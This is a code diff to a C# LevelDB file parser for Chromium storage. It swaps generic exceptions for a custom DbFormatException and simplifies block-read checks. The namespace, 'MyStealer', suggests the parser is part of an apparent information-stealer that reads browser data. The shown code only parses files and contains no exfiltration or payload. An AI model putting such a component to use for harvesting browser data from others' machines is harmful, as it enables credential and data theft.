@@ -27,9 +27,7 @@ using System.Collections;
 using System.Globalization;
 using System.Text.RegularExpressions;
 using System.Text;
-using Serilog;
 using Snappy;
-using System.Runtime.Remoting.Messaging;
 using System.Collections.Immutable;
 using MyStealer.Utils.Chromium.LevelDb;
 
@@ -43,7 +41,6 @@ using MyStealer.Utils.Chromium.LevelDb;
 /// </summary>
 public static class CclLevelDb
 {
-
     // See: https://github.com/google/leveldb/blob/master/doc/table_format.md
     //     A BlockHandle contains an offset and length of a block in an ldb table file
     public class BlockHandle
@@ -267,7 +264,7 @@ public static class CclLevelDb
 
             var magic = Stream.ReadLeUInt64();
             if (magic != MAGIC)
-                throw new Exception($"Invalid magic number in {file}");
+                throw new DbFormatException($"Invalid magic number in {file}");
             index = ReadIndex();
         }
 
@@ -280,10 +277,8 @@ public static class CclLevelDb
             // 1    4     CRC32
             Stream.Seek(handle.Offset, SeekOrigin.Begin);
 
-            var rawBlock = Stream.ReadBytes(handle.Length);
-            var trailer = Stream.ReadBytes(BLOCK_TRAILER_SIZE);
-            if (rawBlock.Length != handle.Length || trailer.Length != BLOCK_TRAILER_SIZE)
-                throw new Exception($"Could not read all of the block at offset {handle.Offset} in file {FilePath}");
+            var rawBlock = Stream.ReadBytes(handle.Length, true);
+            var trailer = Stream.ReadBytes(BLOCK_TRAILER_SIZE, true);
 
             var isCompressed = trailer[0] != 0;
             if (isCompressed)
@@ -291,7 +286,7 @@ public static class CclLevelDb
                 var buffer = new byte[SnappyCodec.GetUncompressedLength(rawBlock, 0, rawBlock.Length)];
                 var written = SnappyCodec.Uncompress(rawBlock, 0, rawBlock.Length, buffer, 0);
                 if (written != buffer.Length)
-                    throw new Exception("Snappy decompression length mismatched");
+                    throw new DbFormatException("Snappy decompression length mismatched; Is the database corrupted?");
 
                 rawBlock = buffer;
             }
@@ -388,7 +383,7 @@ public static class CclLevelDb
                         if (block_type == LogEntryType.Full)
                         {
                             if (in_record)
-                                throw new Exception($"Full block whilst still building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
+                                throw new DbFormatException($"Full block whilst still building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
 
                             in_record = false;
                             yield return (idx * LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
@@ -396,7 +391,7 @@ public static class CclLevelDb
                         else if (block_type == LogEntryType.First)
                         {
                             if (in_record)
-                                throw new Exception($"First block whilst still building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
+                                throw new DbFormatException($"First block whilst still building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
 
                             start_block_offset = idx * LOG_BLOCK_SIZE + buff.Position;
                             block = buff.ReadBytes(length);
@@ -405,14 +400,14 @@ public static class CclLevelDb
                         else if (block_type == LogEntryType.Middle)
                         {
                             if (!in_record)
-                                throw new Exception($"Middle block whilst not building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
+                                throw new DbFormatException($"Middle block whilst not building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
 
                             block.Append(buff.ReadBytes(length));
                         }
                         else if (block_type == LogEntryType.Last)
                         {
                             if (!in_record)
-                                throw new Exception($"Last block whilst not building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
+                                throw new DbFormatException($"Last block whilst not building a block at offset {idx * LOG_BLOCK_SIZE + buff.Position} in {FilePath}");
 
                             block.Append(buff.ReadBytes(length));
                             in_record = false;
